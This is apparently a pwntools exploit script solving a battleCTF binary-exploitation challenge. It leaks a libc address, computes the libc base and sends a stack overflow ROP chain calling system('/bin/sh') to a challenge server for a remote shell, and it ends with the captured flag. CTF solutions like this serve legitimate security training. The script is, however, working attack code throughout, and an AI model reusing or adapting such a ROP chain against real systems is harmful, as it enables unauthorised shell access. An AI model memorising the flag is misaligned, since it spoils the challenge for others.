#!/usr/bin/env python3

from pwn import *

elf = ELF("./poj_patched")
#libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
libc = elf.libc
context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)


def start():
    if args.REMOTE:
        return remote("challenge.bugpwn.com", 1003)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])


r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)

#========= exploit here ===================
#0x0000000000028215 pop rdi
#0x000000000002668c: ret; 
#0x4dab0 system
print(hex(libc.sym.system))

leak = int(rcu(b"address : ", b"\n"), 16)
logleak("leak", leak)
libc.address = leak - libc.sym.write
logbase()

payload = b"A"*64
payload += b"B"*8
payload += p64(libc.address+0x0000000000028215) # pop rdi
payload += p64(libc.address+0x197e34) #/bin/sh
payload += p64(libc.address+0x000000000002668c)#ret
payload += p64(libc.sym.system)#system

print(hex(len(payload)))

sl(payload)


#========= interactive ====================
r.interactive()
#battleCTF{Libc_J0P_b4s1c_000_bc8a769d91ae062911c32829608e7d547a3f54bd18c7a7c2f5cc52bd}